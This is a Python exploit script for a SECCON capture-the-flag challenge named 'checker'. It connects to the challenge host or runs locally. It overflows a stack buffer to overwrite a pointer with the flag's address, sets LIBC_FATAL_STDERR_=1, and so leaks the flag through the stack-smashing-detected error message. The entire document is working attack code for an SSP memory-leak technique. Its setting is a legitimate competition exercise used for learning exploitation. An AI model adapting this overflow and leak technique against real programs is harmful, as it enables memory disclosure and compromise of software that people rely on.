#!/usr/bin/env python
from sc_pwn import *

str_pname   = './checker'

env = Environment('local', 'remote')
env.set_item('mode',    local   = 'LOCAL', \
                        remote  = 'SOCKET')
env.set_item('target',  local   = {'program':str_pname}, \
                        remote  = {'host':'checker.pwn.seccon.jp','port':14726})
env.select()

binf = ELF(str_pname)
addr_flag   = binf.symbol('flag')
addr_name   = binf.symbol('name')

#==========
def attack(cmn):
    cmn.read_until('NAME : ')
    cmn.sendln('LIBC_FATAL_STDERR_=1')
    
    for i in range(7,3,-1):
        cmn.read_until('>> ')
        cmn.sendln('a'*(0x188+i))
    cmn.read_until('>> ')
    cmn.sendln('a'*0x188+pack_64(addr_name))
        
    for i in range(7,3,-1):
        cmn.read_until('>> ')
        cmn.sendln('a'*(0x178+i))
    cmn.read_until('>> ')
    cmn.sendln('a'*0x178+pack_64(addr_flag))

    cmn.read_until('>> ')
    cmn.sendln('yes')
    
    cmn.read_until('FLAG : ')
    cmn.sendln('flag')

    s = cmn.read_all()
    print s
    m = re.search(r'\*\*\* stack smashing detected \*\*\*: ([^\s]+)', s)
    info('FLAG : %s' % m.group(1))

#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)
    
    del(cmn)
    
#==========
